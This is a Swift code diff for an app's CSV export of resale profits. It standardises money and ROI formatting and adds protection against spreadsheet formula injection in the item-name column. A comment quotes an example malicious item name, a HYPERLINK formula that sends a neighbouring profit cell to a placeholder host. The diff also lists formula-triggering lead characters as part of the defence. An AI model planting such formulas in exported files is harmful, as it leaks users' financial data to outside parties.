@@ -192,12 +192,19 @@ final class FlipsViewModel {
         var rows = ["Date,Item,Paid,Sold,Fees,Profit,ROI"]
         for r in sold {
             let date = r.soldDate.map { day.string(from: $0) } ?? ""
-            let paid = r.paidPrice.map { Self.decimalString($0) } ?? ""
-            let soldStr = r.soldPrice.map { Self.decimalString($0) } ?? ""
-            let fees = r.feesEstimate.map { Self.decimalString($0) } ?? ""
-            let profit = r.realizedProfit.map { Self.decimalString($0) } ?? ""
-            let roi = r.roi.map { Self.roiPercentPlain($0) } ?? ""
-            let cols = [date, r.itemName, paid, soldStr, fees, profit, roi].map(Self.csvEscape)
+            let paid = r.paidPrice.map { Self.moneyColumn($0) } ?? ""
+            let soldStr = r.soldPrice.map { Self.moneyColumn($0) } ?? ""
+            let fees = r.feesEstimate.map { Self.moneyColumn($0) } ?? ""
+            let profit = r.realizedProfit.map { Self.moneyColumn($0) } ?? ""
+            let roi = r.roi.map { Self.roiColumn($0) } ?? ""
+            // Only the item name is free text, and only free text is neutered.
+            // Running the money columns through the same escape would make a
+            // loss ("-12.50") a text cell, and reconciling the file is the
+            // entire point of it.
+            let cols = [Self.csvEscape(date), Self.csvText(r.itemName),
+                        Self.csvEscape(paid), Self.csvEscape(soldStr),
+                        Self.csvEscape(fees), Self.csvEscape(profit),
+                        Self.csvEscape(roi)]
             rows.append(cols.joined(separator: ","))
         }
         return rows.joined(separator: "\r\n") + "\r\n"
@@ -248,17 +255,52 @@ final class FlipsViewModel {
         return Calendar.current.isDate(date, equalTo: Date(), toGranularity: .month)
     }
 
-    private static func decimalString(_ value: Double) -> String {
-        String(format: "%.2f", value)
+    /// Every numeric column at the same scale, in a spreadsheet's own notation.
+    ///
+    /// The columns used to split on overload resolution. `paidPrice`,
+    /// `soldPrice` and `feesEstimate` are `Double?` and went through
+    /// `String(format: "%.2f")`; `realizedProfit` is `Decimal?` and went
+    /// through `NSDecimalNumber.stringValue`, which prints the value's natural
+    /// scale and nothing more. That profit is built by subtracting
+    /// `Decimal(Double)` conversions — the conversion `MarketplaceFees` warns
+    /// "would capture the Double's rounding error" — so the one column an
+    /// accountant actually reconciles was the only money column with no
+    /// guaranteed cent scale: 8.00, 65.00, 9.00 exported a profit of "48".
+    ///
+    /// POSIX and ungrouped on purpose: a locale that groups with a comma would
+    /// put a column break inside a number, and one that uses a decimal comma
+    /// would make every money cell text.
+    private static let csvNumber: NumberFormatter = {
+        let f = NumberFormatter()
+        f.locale = Locale(identifier: "en_US_POSIX")
+        f.numberStyle = .decimal
+        f.usesGroupingSeparator = false
+        f.minimumFractionDigits = 2
+        f.maximumFractionDigits = 2
+        f.roundingMode = .halfUp
+        return f
+    }()
+
+    private static func moneyColumn(_ value: Decimal) -> String {
+        csvNumber.string(from: NSDecimalNumber(decimal: value)) ?? "0.00"
     }
 
-    private static func decimalString(_ value: Decimal) -> String {
-        NSDecimalNumber(decimal: value).stringValue
+    /// The `Double` overload formats the `Double` directly rather than going
+    /// through `Decimal(value)` — that conversion is the lossy one, and there
+    /// is nothing to gain by taking it on the way to two decimal places.
+    private static func moneyColumn(_ value: Double) -> String {
+        csvNumber.string(from: NSNumber(value: value)) ?? "0.00"
     }
 
-    private static func roiPercentPlain(_ fraction: Decimal) -> String {
-        let value = Int((NSDecimalNumber(decimal: fraction).doubleValue * 100).rounded())
-        return "\(value)%"
+    /// ROI to two decimals, so a row can be recomputed from its own columns.
+    ///
+    /// It was `Int((fraction * 100).rounded())`, which exported 0.4249 as
+    /// "42%" — profit ÷ paid from the neighbouring cells does not give 42, so
+    /// the column could not be checked against the file it lives in. Still a
+    /// percent with its sign, because that is what the header says and what a
+    /// spreadsheet reads "42.49%" back as.
+    private static func roiColumn(_ fraction: Decimal) -> String {
+        (csvNumber.string(from: NSDecimalNumber(decimal: fraction * 100)) ?? "0.00") + "%"
     }
 
     private static func monthLabel(_ date: Date) -> String {
@@ -284,5 +326,28 @@ final class FlipsViewModel {
             return field
         }
         return "\"" + field.replacingOccurrences(of: "\"", with: "\"\"") + "\""
+    }
+
+    /// Characters a spreadsheet reads as "this cell is a formula".
+    static let csvFormulaLeads: Set<Character> = ["=", "+", "-", "@", "\t", "\r"]
+
+    /// A free-text field, made safe to open.
+    ///
+    /// RFC-4180 quoting is not a defence. Excel, Numbers and LibreOffice strip
+    /// the quotes on import and then evaluate any cell whose first character is
+    /// one of `csvFormulaLeads`. The Item column is model-generated from
+    /// whatever text was visible on the label and is user-editable, so
+    /// `=HYPERLINK("http://x/?"&C2,"click")` as an item name becomes a live
+    /// formula that reads the profit cell next to it — in the one file in this
+    /// product a user is likely to forward to an accountant.
+    ///
+    /// A leading apostrophe is the standard neutering: spreadsheets take it as
+    /// "the rest is text". It costs a visible `'` on the rare honest name that
+    /// starts with a dash, which is the right side of that trade.
+    static func csvText(_ field: String) -> String {
+        guard let first = field.first, csvFormulaLeads.contains(first) else {
+            return csvEscape(field)
+        }
+        return "\"'" + field.replacingOccurrences(of: "\"", with: "\"\"") + "\""
     }
 }
